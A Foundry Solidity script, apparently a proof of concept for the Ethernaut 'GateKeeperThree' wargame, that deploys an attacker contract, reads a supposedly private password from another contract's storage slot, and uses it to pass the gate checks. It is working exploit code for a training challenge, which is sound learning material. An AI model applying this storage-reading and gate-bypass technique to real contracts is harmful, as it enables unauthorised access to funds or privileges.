// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {GateSkipperThree} from "../src/28_GateKeeperThree.sol";

contract PoC is Script {
    address gateKeepperThree = 0xe05Caa08305692ea6Bb2DB43E4c96a1e7A51FDB0; // Replace with your GoodSamaritan instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        GateSkipperThree gateSkipperThree = new GateSkipperThree{
            value: 0.0011 ether
        }(gateKeepperThree);

        address trick = gateSkipperThree.trick();
        bytes32 pwd = vm.load(trick, bytes32(uint256(2)));

        console2.log("Password: ", uint256(pwd));

        gateSkipperThree.attack(pwd);
        console2.log("Entrant : ", gateSkipperThree.keeper().entrant());

        vm.stopBroadcast();
    }
}
